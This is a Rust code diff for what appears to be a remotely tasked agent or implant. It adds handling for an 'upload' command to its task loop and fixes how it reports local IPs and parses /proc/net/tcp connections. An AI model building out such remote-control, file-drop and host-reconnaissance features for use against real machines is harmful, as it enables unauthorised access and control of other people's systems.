@@ -161,7 +161,16 @@ pub fn link_loop() {
                 } else if task.q == "exit" {
                     break;
                 } else {
-                    prev_output = dispatch(&task.q);
+                    let effective_cmd = if task.q.starts_with("upload ") {
+                        if let (Some(content), Some(path)) = (&task.upload, &task.upload_path) {
+                            format!("upload {} {}", content, path)
+                        } else {
+                            task.q.clone()
+                        }
+                    } else {
+                        task.q.clone()
+                    };
+                    prev_output = dispatch(&effective_cmd);
                     prev_task_id = task.tasking.clone();
                 }
             }
@@ -506,9 +515,14 @@ fn get_interface_ip(interface: &str) -> Option<String> {
         return None;
     }
 
-    // For simplicity, we'll just indicate the interface is up
+    // Return the main local IP for simplicity
     // In a real implementation, you would parse /proc/net/fib_trie or use netlink
-    Some(format!("{}: IP detection available", interface))
+    let ip = local_ip();
+    if ip == "unknown" {
+        None
+    } else {
+        Some(ip)
+    }
 }
 
 fn list_processes() -> String {
@@ -648,46 +662,51 @@ fn parse_net_connections(content: &str, proto: &str, connections: &mut Vec<Strin
     // Skip header line
     for line in content.lines().skip(1) {
         let parts: Vec<&str> = line.split_whitespace().collect();
-        if parts.len() >= 10 {
-            let local_ip_hex = parts[1];
-            let local_port_hex = parts[2];
-            let remote_ip_hex = parts[3];
-            let remote_port_hex = parts[4];
-            let state = parts[5];
-            let inode = parts[9];
-
-            // Convert hex to decimal
-            let local_ip = hex_to_ip(local_ip_hex);
-            let local_port = hex_to_port(local_port_hex);
-            let remote_ip = hex_to_ip(remote_ip_hex);
-            let remote_port = hex_to_port(remote_port_hex);
-
-            // Get process info from inode
-            let process_info = get_process_from_inode(inode);
-
-            connections.push(format!(
-                "{}\t{}:{}\t\t{}:{}\t\t{}\t{}",
-                proto, local_ip, local_port, remote_ip, remote_port, state, process_info
-            ));
+        if parts.len() < 10 {
+            continue;
         }
+        // Each address field is "IPHEX:PORTHEX"
+        let (local_ip_hex, local_port_hex) = match parts[1].split_once(':') {
+            Some(pair) => pair,
+            None => continue,
+        };
+        let (remote_ip_hex, remote_port_hex) = match parts[2].split_once(':') {
+            Some(pair) => pair,
+            None => continue,
+        };
+        let state = parts[3];
+        let inode = parts[9];
+
+        // Convert hex to decimal
+        let local_ip = hex_to_ip(local_ip_hex);
+        let local_port = hex_to_port(local_port_hex);
+        let remote_ip = hex_to_ip(remote_ip_hex);
+        let remote_port = hex_to_port(remote_port_hex);
+
+        // Get process info from inode
+        let process_info = get_process_from_inode(inode);
+
+        connections.push(format!(
+            "{}\t{}:{}\t\t{}:{}\t\t{}\t{}",
+            proto, local_ip, local_port, remote_ip, remote_port, state, process_info
+        ));
     }
 }
 
 fn hex_to_ip(hex_str: &str) -> String {
-    let mut ip = String::new();
-    // Split hex string into 4 bytes (8 characters, 2 per byte)
-    for i in (0..8).step_by(2) {
-        if i + 1 < hex_str.len() {
-            let byte_hex = &hex_str[i..i + 2];
-            if let Ok(byte) = u8::from_str_radix(byte_hex, 16) {
-                ip.push_str(&byte.to_string());
-                if i < 6 {
-                    ip.push('.');
-                }
-            }
-        }
+    if hex_str.len() < 8 {
+        return hex_str.to_string();
     }
-    ip
+    // /proc/net/tcp stores IPs in little-endian order — read bytes in reverse
+    (0..4)
+        .rev()
+        .map(|i| {
+            u8::from_str_radix(&hex_str[i * 2..i * 2 + 2], 16)
+                .map(|b| b.to_string())
+                .unwrap_or_else(|_| "?".to_string())
+        })
+        .collect::<Vec<_>>()
+        .join(".")
 }
 
 fn hex_to_port(hex_str: &str) -> String {
